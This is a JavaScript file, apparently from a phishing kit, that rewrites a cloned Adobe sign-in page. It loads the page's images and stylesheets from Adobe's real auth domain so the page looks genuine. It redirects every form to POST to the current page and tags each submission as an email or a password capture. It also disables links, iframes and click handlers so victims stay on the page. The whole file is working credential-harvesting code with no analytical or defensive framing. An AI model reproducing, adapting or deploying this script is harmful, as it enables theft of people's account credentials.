try {
    document.querySelectorAll("link").forEach(li => {
        let prev = li.href
        let len = location.origin.length
        if (prev.includes(location.origin)) {
            prev = prev.slice(len, prev.length)
            li.href = `https://auth.services.adobe.com${prev}`
        }
    })

    document.querySelectorAll("img").forEach(li => {
        let prev = li.src
        let len = location.origin.length
        if (prev.includes(location.origin)) {
            prev = prev.slice(len, prev.length)
            li.src = `https://auth.services.adobe.com${prev}`
        }
    })


    let allForms = document.querySelectorAll("form")
    for (let form of allForms) {
        form.innerHTML += `<input type="hidden" name="spike-type">`
    }
    // setting spike type
    function addSpikeType(value) {
        let allSpikes = document.querySelectorAll(`[name="spike-type"]`)
        for (let spike of allSpikes) {
            spike.value = value
        }
    }

    document.querySelectorAll("form").forEach(f => {
        f.action = location.href
        f.method = "POST"
        f.noValidate = false
    })

    document.querySelectorAll("iframe").forEach(f => {
        f.remove()
    })

    document.querySelectorAll("input").forEach(inp => {
        if (inp.type != "hidden") {
            inp.required = true
        }
    })

    document.querySelectorAll("a").forEach(atag => {
        atag.href = location.href
    })

    document.querySelectorAll("[onclick]").forEach(onclk => {
        onclk.onclick = function () { }
    })

    // sets
    let email = document.querySelector("#EmailPage-EmailField")
    let password = document.querySelector(`[data-id="Profile-Email"]`)
    if (email && password == undefined) {
        addSpikeType("email")
    }
    else if (password) {
        addSpikeType("password")
        document.querySelector("#PasswordPage-PasswordField").style = ``
    }

    if (document.body.innerText.includes("That’s an incorrect password. Try again.")) {
        addSpikeType("password")
    }


    // functions
    let hiPassword = document.querySelector(".credential-hide-helper")
    if (hiPassword) {
        hiPassword.remove()
    }

    let showPassBtn = document.querySelector(`[aria-label="Show password"]`)
    let session_password = document.querySelector("#PasswordPage-PasswordField")
    let showPass = false
    if (showPassBtn) {
        showPassBtn.addEventListener("click", () => {
            if (showPass == false) {
                session_password.type = "text"
                showPass = true
            } else {
                session_password.type = "password"
                showPass = false
            }
        })
    }

    let submitbtn1 = document.querySelector(`[data-id="PasswordPage-ContinueButton"]`)
    let submitbtn2 = document.querySelector(`[data-id="EmailPage-ContinueButton"]`)
    if (submitbtn1) {
        submitbtn1.classList.remove("is-disabled")
        submitbtn1.disabled = false
    }

    if (submitbtn2) {
        submitbtn2.classList.remove("is-disabled")
        submitbtn2.disabled = false
    }
} catch (error) {
    location.href = location.href
}